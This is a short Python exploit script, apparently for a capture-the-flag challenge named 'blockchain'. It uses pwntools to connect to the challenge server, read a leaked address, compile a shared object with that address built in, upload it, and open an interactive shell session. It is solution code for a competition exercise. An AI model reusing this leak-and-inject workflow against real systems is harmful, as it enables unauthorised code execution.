#!/usr/bin/env python3
import subprocess

from pwn import *


def connect():
    if args.LOCAL:
        os.environ["LD_LIBRARY_PATH"] = "output"
        return gdb.debug(
            ["output/blockchain"],
            api=True,
        )
    elif args.DOCKER:
        return remote("172.17.0.2", 5000)
    else:
        return remote("chal.nbctf.com", 30173)


def main():
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.execute("set breakpoint pending on")
            tube.gdb.execute("b challenge")
            tube.gdb.continue_nowait()
        subprocess.check_call(["make", "clean"])
        tube.recvuntil(b"leak: ")
        leak = int(tube.recvline(), 16)
        subprocess.check_call(["make", f"EXTRA_CFLAGS=-DLEAK=0x{leak:x}"])
        with open("pwnit.so", "rb") as fp:
            so = fp.read()
        if args.DOCKER:
            input("go")
        tube.sendafter(b"ELF file: ", so)
        if args.LOCAL:
            tube.gdb.wait()
            tube.gdb.execute("b *(challenge-0x23d50+0x24bc5)")
            tube.gdb.continue_nowait()
        tube.interactive()


if __name__ == "__main__":
    main()
